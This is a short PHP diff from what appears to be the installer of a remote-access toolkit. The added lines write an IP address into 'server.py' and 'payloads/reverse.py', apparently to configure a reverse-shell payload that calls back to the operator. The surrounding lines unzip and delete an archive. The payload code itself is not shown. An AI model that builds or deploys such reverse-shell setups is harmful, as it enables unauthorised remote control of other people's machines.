@@ -46,6 +46,10 @@ if (file_exists($server_file)) {
     echo "Error: '$server_file' not found.";
 }
 
+ $a = file_get_contents("server.py");
+    $a = str_replace("[[*IP*]]", $ip, $a);
+    file_put_contents("server.py", $a);
+
 if (file_exists($reverse_file)) {
     $a = file_get_contents($reverse_file);
     $a = str_replace("[[*IP*]]", $ip, $a);
@@ -53,6 +57,11 @@ if (file_exists($reverse_file)) {
 } else {
     echo "Error: '$reverse_file' not found.";
 }
+
+    $a = file_get_contents("payloads/reverse.py");
+    $a = str_replace("[[*IP*]]", $ip, $a);
+    file_put_contents("payloads/reverse.py", $a);
+
 exec("unzip nnnet.zip");
 exec("unlink nnnet.zip");
 
